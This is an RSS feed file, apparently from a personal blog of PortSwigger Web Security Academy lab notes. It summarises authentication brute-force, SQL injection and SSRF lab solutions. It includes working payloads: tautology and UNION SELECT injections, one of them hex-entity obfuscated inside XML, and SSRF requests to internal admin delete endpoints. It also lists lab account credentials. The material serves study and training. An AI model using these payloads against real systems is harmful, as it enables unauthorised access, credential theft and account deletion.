@@ -1,0 +1,41 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
+  <channel>
+    <title>PortSwigger on Lets Learn Together</title>
+    <link>https://d31ty.github.io/tags/portswigger/</link>
+    <description>Recent content in PortSwigger on Lets Learn Together</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en-us</language>
+    <lastBuildDate>Sun, 15 Oct 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://d31ty.github.io/tags/portswigger/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Postswigger Server Based Attacks - Authentication</title>
+      <link>https://d31ty.github.io/portswigger/server-based/authentication/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/portswigger/server-based/authentication/</guid>
+      <description>Brute Force Lab 1: Username and Password Brute force: Username: accounts Password: robert Lab 2: Username and Password Brute force with the message from response: Username: oracle Password: soccer Username and Password Brute force with 30mins to retry: </description>
+    </item>
+    
+    <item>
+      <title>Postswigger Server Based Attacks - SQLi</title>
+      <link>https://d31ty.github.io/portswigger/server-based/sqli/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/portswigger/server-based/sqli/</guid>
+      <description>Different SQLi Methods Lab 1: https://0aab00d603b57c2084c1bee800e900c4.web-security-academy.net/filter?category=Gifts&amp;#39;+OR+1=1-- Lab 2: administrator&amp;#39;-- Lab 3: USERNAME: carlos administrator wiener PASSWORD: r5h2o8l8ebgh9t8qppua fppcw9cmla9y2g8ogewn p85707uom2jve88xzdqe Query: &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;1 &amp;lt;/productId&amp;gt;&amp;lt;storeId&amp;gt;&amp;lt;@hex_entities&amp;gt;1 UNION SELECT USERNAME FROM USERS&amp;lt;@/hex_entities&amp;gt;&amp;lt;/storeId&amp;gt;&amp;lt;/stockCheck&amp;gt; &amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34;?&amp;gt;&amp;lt;stockCheck&amp;gt;&amp;lt;productId&amp;gt;1 &amp;lt;/productId&amp;gt;&amp;lt;storeId&amp;gt;&amp;lt;@hex_entities&amp;gt;1 UNION SELECT PASSWORD FROM USERS&amp;lt;@/hex_entities&amp;gt;&amp;lt;/storeId&amp;gt;&amp;lt;/stockCheck&amp;gt; Other Solution:
+SQL | Concatenation Operator So the command is = SELECT USERNAME || &amp;lsquo;~&amp;rsquo; || PASSWORD FROM USER
+Lesson Learned: If select * doesn&amp;rsquo;t work, then try enumerating the column names in SQLi</description>
+    </item>
+    
+    <item>
+      <title>Postswigger Server Based Attacks - SSRF</title>
+      <link>https://d31ty.github.io/portswigger/server-based/ssrf/</link>
+      <pubDate>Sun, 15 Oct 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://d31ty.github.io/portswigger/server-based/ssrf/</guid>
+      <description>Lab 1: Basic SSRF - Delete user Carlos
+stockapi = http://localhost/admin/delete?username=carlos Lab 2: stockapi = http://192.168.0.4/admin/delete?username=carlos Lab 3: stockapi = http://127.1/%25%36%31dmin Lab 4: Lab 5: stockapi = /product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin/delete%3fusername%3dcarlos </description>
+    </item>
+    
+  </channel>
+</rss>
